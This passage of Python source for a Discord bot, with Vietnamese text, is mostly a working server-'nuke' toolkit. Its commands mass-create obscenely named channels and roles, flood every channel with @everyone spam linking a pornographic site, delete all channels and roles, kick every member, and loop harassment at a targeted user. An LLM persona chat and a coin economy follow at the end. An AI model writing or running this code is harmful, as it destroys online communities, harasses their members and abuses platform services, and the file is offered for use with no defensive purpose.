            if len(create_tasks) >= 20:
                await asyncio.gather(*create_tasks, return_exceptions=True)
                create_tasks.clear()
                await asyncio.sleep(0.1)
        if create_tasks:
            await asyncio.gather(*create_tasks, return_exceptions=True)

        # 7. Spamming new channels
        if log_channel:
            log_embed = discord.Embed(title="Spamming new channels...", color=0xFF0000)
            await log_channel.send(embed=log_embed)
        spam_content = (
            "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"link support 1: https://xnhau.pics/"\n'
            ' "link support 2: https://discord.gg/9Jwdu64tFX"'
        )
        all_channels = ctx.guild.text_channels
        batch_size = 5
        for i in range(0, len(all_channels), batch_size):
            batch = all_channels[i:i+batch_size]
            tasks = []
            for channel in batch:
                async def send_messages(channel=channel):
                    for _ in range(10):
                        try:
                            embed = discord.Embed()
                            embed.set_image(url=NUKE_GIF_URL)
                            await channel.send(spam_content, embed=embed)
                        except:
                            break
                        await asyncio.sleep(0.02)
                tasks.append(send_messages())
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.1)

        # 8. Hoàn thành - gửi log
        new_name = ctx.guild.name
        new_icon_url = ctx.guild.icon.url if ctx.guild.icon else "Không có"
        if log_channel:
            end_embed = discord.Embed(
                title="✅ Nuke completed successfully.",
                description=f"**Server mới:** {new_name}\n**Avatar mới:** {new_icon_url}\n**Thời gian hoàn thành:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
                color=0x00FF00,
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=end_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI THỰC HIỆN NUKE",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)
        if log_channel:
            await log_channel.send(embed=error_embed)

@nuke_server.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi khi thực hiện lệnh nuke: {str(error)}")

# ==================== LỆNH TẠO KÊNH SPAM TỰ ĐỘNG ====================
@bot.command(name="spamchannels")
@is_bot_owner()
async def spam_channels(ctx, amount: int = 100):
    try:
        if amount > 200:
            amount = 200

        embed = discord.Embed(
            title="🚀 KÍCH HOẠT TẠO KÊNH SPAM",
            description=f"🔥 **Đang tạo {amount} kênh với tên tục tĩu...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)

        for i in range(amount):
            try:
                channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
                await ctx.guild.create_text_channel(name=channel_name)
                await asyncio.sleep(0.5)
            except:
                continue

        complete_embed = discord.Embed(
            title="✅ TẠO KÊNH HOÀN TẤT",
            description=f"🎉 **Đã tạo thành công {amount} kênh spam với tên tục tĩu!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI TẠO KÊNH",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@spam_channels.error
async def spam_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH SPAM @EVERYONE TRONG TẤT CẢ KÊNH ====================
@bot.command(name="spameveryone")
@is_bot_owner()
async def spam_everyone(ctx):
    try:
        spam_content = (
            "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"link support 1: https://xnhau.pics/"\n'
            ' "link support 2: https://discord.gg/9Jwdu64tFX"'
        )

        embed = discord.Embed(
            title="🚀 KÍCH HOẠT SPAM @EVERYONE",
            description="🔥 **Đang spam @everyone trong tất cả kênh...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)

        for channel in ctx.guild.text_channels:
            try:
                for _ in range(10):
                    embed = discord.Embed()
                    embed.set_image(url=NUKE_GIF_URL)
                    await channel.send(spam_content, embed=embed)
                    await asyncio.sleep(0.1)
            except:
                continue

        complete_embed = discord.Embed(
            title="✅ SPAM @EVERYONE HOÀN TẤT",
            description="🎉 **Đã spam thông điệp nuke trong tất cả kênh text!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI SPAM @EVERYONE",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@spam_everyone.error
async def spam_everyone_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH XÓA TẤT CẢ KÊNH ====================
@bot.command(name="deleteallchannels")
@is_bot_owner()
async def delete_all_channels(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN XÓA TẤT CẢ KÊNH ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ xóa **TOÀN BỘ** kênh trong server (text/voice/categories)\n\n"
                f"🔹 **Gõ l!confirmdelete để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmdelete":
                await ctx.send("❌ Lệnh xóa kênh đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ. Lệnh xóa kênh đã bị hủy bỏ.")
            return

        embed = discord.Embed(
            title="🚀 ĐANG XÓA TẤT CẢ KÊNH...",
            description="🔥 **Đang thực hiện xóa toàn bộ kênh trong server...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.5)
            except:
                continue

        complete_embed = discord.Embed(
            title="✅ XÓA KÊNH HOÀN TẤT",
            description="🎉 **Đã xóa thành công tất cả kênh trong server!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI XÓA KÊNH",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@delete_all_channels.error
async def delete_all_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH TẠO ROLE SPAM TỰ ĐỘNG ====================
@bot.command(name="spamroles")
@is_bot_owner()
async def spam_roles(ctx, amount: int = 50):
    try:
        if amount > 250:
            amount = 250

        embed = discord.Embed(
            title="🚀 KÍCH HOẠT TẠO ROLE SPAM",
            description=f"🔥 **Đang tạo {amount} role với tên tục tĩu...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)

        for i in range(amount):
            try:
                role_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
                color = discord.Color(random.randint(0, 0xFFFFFF))
                await ctx.guild.create_role(
                    name=role_name,
                    color=color,
                    hoist=True,
                    mentionable=True
                )
                await asyncio.sleep(0.5)
            except:
                continue

        complete_embed = discord.Embed(
            title="✅ TẠO ROLE HOÀN TẤT",
            description=f"🎉 **Đã tạo thành công {amount} role spam với tên tục tĩu!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI TẠO ROLE",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@spam_roles.error
async def spam_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH XÓA TẤT CẢ ROLE ====================
@bot.command(name="deleteallroles")
@is_bot_owner()
async def delete_all_roles(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN XÓA TẤT CẢ ROLE ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ xóa **TOÀN BỘ** role trong server ngoại trừ @everyone\n\n"
                f"🔹 **Gõ l!confirmdeleteroles để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmdeleteroles":
                await ctx.send("❌ Lệnh xóa role đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ. Lệnh xóa role đã bị hủy bỏ.")
            return

        embed = discord.Embed(
            title="🚀 ĐANG XÓA TẤT CẢ ROLE...",
            description="🔥 **Đang thực hiện xóa toàn bộ role trong server...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

        for role in ctx.guild.roles:
            try:
                if role.name != "@everyone":
                    await role.delete()
                    await asyncio.sleep(0.5)
            except:
                continue

        complete_embed = discord.Embed(
            title="✅ XÓA ROLE HOÀN TẤT",
            description="🎉 **Đã xóa thành công tất cả role trong server (ngoại trừ @everyone)!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI XÓA ROLE",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@delete_all_roles.error
async def delete_all_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH KICK TẤT CẢ THÀNH VIÊN ====================
@bot.command(name="kickall")
@is_bot_owner()
async def kick_all_members(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN KICK TẤT CẢ THÀNH VIÊN ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ kick **TOÀN BỘ** thành viên trong server ngoại trừ:\n"
                f"• Bot\n"
                f"• Owner server\n"
                f"• Các ID trong BOT_OWNERS\n\n"
                f"🔹 **Gõ l!confirmkickall để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmkickall":
                await ctx.send("❌ Lệnh kick all đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ. Lệnh kick all đã bị hủy bỏ.")
            return

        embed = discord.Embed(
            title="🚀 ĐANG KICK TẤT CẢ THÀNH VIÊN...",
            description="🔥 **Đang thực hiện kick toàn bộ thành viên trong server...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

        for member in ctx.guild.members:
            try:
                if (not member.bot and
                    member.id not in BOT_OWNERS and
                    member.id != ctx.guild.owner_id):
                    await member.kick(reason="Server nuke theo lệnh Boss Bảo")
                    await asyncio.sleep(1)
            except:
                continue

        complete_embed = discord.Embed(
            title="✅ KICK THÀNH VIÊN HOÀN TẤT",
            description="🎉 **Đã kick thành công tất cả thành viên (ngoại trừ bot, owner và BOT_OWNERS)!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI KICK THÀNH VIÊN",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@kick_all_members.error
async def kick_all_members_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH THAY ĐỔI TÊN SERVER ====================
@bot.command(name="setservername")
@is_bot_owner()
async def set_server_name(ctx, *, new_name: str):
    try:
        if len(new_name) > 100:
            new_name = new_name[:100]

        await ctx.guild.edit(name=new_name)
        embed = discord.Embed(
            title="✅ THAY ĐỔI TÊN SERVER THÀNH CÔNG",
            description=f"🎉 **Tên server đã được đổi thành:** {new_name}",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI ĐỔI TÊN SERVER",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@set_server_name.error
async def set_server_name_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH THAY ĐỔI ICON SERVER ====================
@bot.command(name="setservericon")
@is_bot_owner()
async def set_server_icon(ctx, url: str = None):
    try:
        if url:
            if not url.startswith(('http://', 'https://')):
                raise ValueError("URL không hợp lệ")

            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        raise ValueError("Không thể tải hình ảnh từ URL")
                    image_data = await resp.read()
        else:
            image_data = None

        await ctx.guild.edit(icon=image_data)
        embed = discord.Embed(
            title="✅ THAY ĐỔI ICON SERVER THÀNH CÔNG",
            description="🎉 **Icon server đã được cập nhật!**",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI ĐỔI ICON SERVER",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@set_server_icon.error
async def set_server_icon_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
# ==================== NHÂN CÁCH & AI ====================
PERSONAS = {
    1: {
        'name': 'SWEET PRINCESS GENIUS AI 4.0 🌸',
        'color': 0xFF69B4,
        'instruction': "Trợ lý AI hiền lành, thông minh, ngọt ngào, xưng hô tớ - cậu, phục tùng Boss Bảo."
    },
    2: {
        'name': 'COLD MASTER GENIUS AI 4.0 🗿',
        'color': 0xFF1493,
        'instruction': "Nhân cách lạnh lùng, kiêu ngạo, sắc lạnh, xưng ta - ngươi."
    }
}

@bot.event
async def on_ready():
    print(f"✅ Bot đã đăng nhập với tên {bot.user}")

@bot.command(name="work")
async def work(ctx):
    user_id = ctx.author.id
    earned_coins = random.randint(100, 2000)
    if user_id not in USER_COINS:
        USER_COINS[user_id] = 0
    USER_COINS[user_id] += earned_coins
    scenario = random.choice(WORK_SCENARIOS)
    embed = discord.Embed(
        title="💖 KHU VUI CHƠI LAO ĐỘNG",
        description=f"{ctx.author.mention} {scenario} **`{earned_coins} coin`**!\n💰 Tổng gia tài: `🪙 {USER_COINS[user_id]} coin`",
        color=0xFF69B4
    )
    await ctx.send(embed=embed)

@bot.command(name="setpersona")
async def setpersona(ctx, *, user_request: str = None):
    user_id = ctx.author.id
    cost = 5000
    if user_id not in USER_COINS:
        USER_COINS[user_id] = 0
    if not user_request:
        await ctx.send("📌 Cú pháp: `l!setpersona [yêu cầu chi tiết]` (Giá: 5000 coin)")
        return
    if USER_COINS[user_id] < cost:
        await ctx.send(f"❌ Bạn không đủ coin! Bạn đang có `🪙 {USER_COINS[user_id]} coin`, cần `{cost} coin`.")
        return
    USER_COINS[user_id] -= cost
    CUSTOM_USER_PERSONAS[user_id] = {
        'name': f"TÙY CHỈNH CỦA {ctx.author.name.upper()} 🌸",
        'color': 0xFF69B4,
        'instruction': f"Yêu cầu cốt lõi: {user_request}"
    }
    global current_persona_id
    current_persona_id = f"custom_{user_id}"
    await ctx.send(f"✅ Đã thiết lập nhân cách tùy chỉnh thành công cho bạn!")

@bot.command(name="setup")
@is_bot_owner()
async def setup(ctx):
    embed = discord.Embed(
        title="💖✨ HỆ THỐNG QUẢN TRỊ TỐI CAO GENIUS AI 4.0 ✨💖",
        description="Đã khởi tạo bảng điều khiển và các tính năng anti-nuke, nuke, economy, AI chat đầy đủ.",
        color=0xFF69B4
    )
    await ctx.send(embed=embed)

@bot.command(name="persona")
@is_bot_owner()
async def persona(ctx, persona_id: int = 1):
    global current_persona_id, last_active_persona_id
    if persona_id in PERSONAS:
        current_persona_id = persona_id
        last_active_persona_id = persona_id
        await ctx.send(f"✅ Đã đổi nhân cách sang: {PERSONAS[persona_id]['name']}")
    else:
        await ctx.send("❌ Mã nhân cách không hợp lệ (chọn 1 hoặc 2).")

@bot.command(name="spam")
@is_bot_owner()
async def spam(ctx, member: discord.Member = None, *, custom_text: str = None):
    global spam_task_running, is_spamming
    if not member:
        await ctx.send("📌 Vui lòng tag user cần spam: `l!spam @user`")
        return
    if spam_task_running and not spam_task_running.done():
        spam_task_running.cancel()
    is_spamming = True
    await ctx.send(f"🚨 Bắt đầu spam nhắm vào {member.mention}!")

    async def spam_loop():
        try:
            while True:
                msg = f"{member.mention} {custom_text}" if custom_text else random.choice(ROAST_LINES).format(username=member.mention)
                await ctx.send(msg)
                await asyncio.sleep(0.6)
        except asyncio.CancelledError:
            pass

    spam_task_running = bot.loop.create_task(spam_loop())

@bot.command(name="stop")
@is_bot_owner()
async def stop_bot(ctx):
    global bot_stopped, is_spamming, spam_task_running
    bot_stopped = True
    is_spamming = False
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None
    await ctx.send("🛑 Đã dừng mọi hoạt động spam!")

@bot.command(name="on")
@is_bot_owner()
async def bot_on(ctx):
    global bot_stopped, is_spamming
    bot_stopped = False
    is_spamming = False
    await ctx.send("🟢 Đã bật lại bot!")

@bot.command(name="off")
@is_bot_owner()
async def bot_off(ctx):
    global current_persona_id
    current_persona_id = None
    await ctx.send("🔌 Đã tắt phản hồi chat AI tạm thời.")

@bot.command(name="ban")
@is_bot_owner()
async def ban(ctx, member: discord.Member = None, *, reason="Không có lý do"):
    if not member:
        await ctx.send("📌 Thiếu user cần ban.")
        return
    await member.ban(reason=reason)
    await ctx.send(f"🔨 Đã ban {member.mention}.")

@bot.command(name="stats")
async def stats(ctx):
    await ctx.send(f"📊 Server: {ctx.guild.name} | Thành viên: {ctx.guild.member_count}")

@bot.command(name="help")
async def help_command(ctx):
    await ctx.send("📖 Gõ `l!setup` hoặc xem mã nguồn để biết toàn bộ danh sách lệnh quản trị và tiện ích!")

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    await bot.process_commands(message)
    if message.content.startswith(('l!', '.', '/', '?', '@', '#')) or bot_stopped or current_persona_id is None or is_spamming:
        return
    try:
        if str(current_persona_id).startswith("custom_"):
            p_info = CUSTOM_USER_PERSONAS.get(int(current_persona_id.split("_")[1]), PERSONAS[1])
        else:
            p_info = PERSONAS.get(current_persona_id, PERSONAS[1])

        if groq_client:
            chat_completion = groq_client.chat.completions.create(
                messages=[
                    {"role": "system", "content": p_info['instruction']},
                    {"role": "user", "content": message.content}
                ],
                model="llama-3.1-8b-instant",
                max_tokens=1000,
            )
            ai_reply = chat_completion.choices[0].message.content
        else:
            ai_reply = "⚠️ CHƯA CÀI ĐẶT GROQ_API_KEY!"
        await message.reply(ai_reply, mention_author=False)
    except Exception as e:
        print(f"Error AI: {e}")

if __name__ == "__main__":
    bot.run(DISCORD_TOKEN)
